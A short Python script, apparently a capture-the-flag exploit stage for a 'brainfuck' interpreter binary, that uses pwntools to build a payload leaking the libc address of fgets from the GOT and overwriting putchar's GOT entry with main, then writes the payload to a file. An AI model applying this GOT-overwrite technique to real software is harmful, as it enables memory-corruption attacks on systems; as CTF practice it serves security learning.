import pwn
from bfptr import bfptr


pwn.context.log_level = 'debug'

elf = pwn.context.binary = pwn.ELF('./brainfuck', checksec=False)

libc = pwn.ELF('/usr/lib32/libc.so.6', checksec=False)


ptr = bfptr()


ptr.move_to(elf.got['fgets'])
#ptr.write_32('abcd')
ptr.read_32()

ptr.move_to(elf.got['putchar'])
ptr.write_32(elf.sym['main'])
ptr.intructions += '.'

print("fgets-sym:" + hex(libc.sym['fgets']))
print("puts-sym:" + hex(libc.sym['puts']))
print(len(ptr.to_payload()))

f = open('pl', 'wb')
f.write(ptr.to_payload())
f.close()


